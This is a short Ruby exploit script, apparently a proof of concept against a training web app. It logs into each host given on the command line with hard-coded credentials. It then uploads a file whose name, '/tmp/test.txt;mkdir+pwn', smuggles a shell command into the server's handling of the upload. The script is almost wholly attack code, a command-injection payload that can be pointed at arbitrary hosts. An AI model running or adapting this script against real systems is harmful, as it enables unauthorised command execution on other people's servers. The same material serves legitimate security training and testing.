#!/usr/bin/env ruby
# Remember to do `touch /tmp/test.txt\;mkdir\+pwn` before running this script.
require 'httpclient'

ARGV.each do |host|
  begin
    url = "http://#{host}:8080/"
    client = HTTPClient.new
    client.connect_timeout = 5
    client.get(url + 'sessions')
    client.post(url + 'sessions', email: 'ken@metacorp.com', password: 'citrusblend')
    body = { 'benefits[backup]' => 'true', 'benefits[upload]' => File.open('/tmp/test.txt;mkdir+pwn') }
    client.post(url + 'upload', body)
  rescue Errno::ECONNREFUSED
    puts "Could not connect to #{url}"
  rescue HTTPClient::ConnectTimeoutError
    puts "Could not connect to #{url}"
  end
end
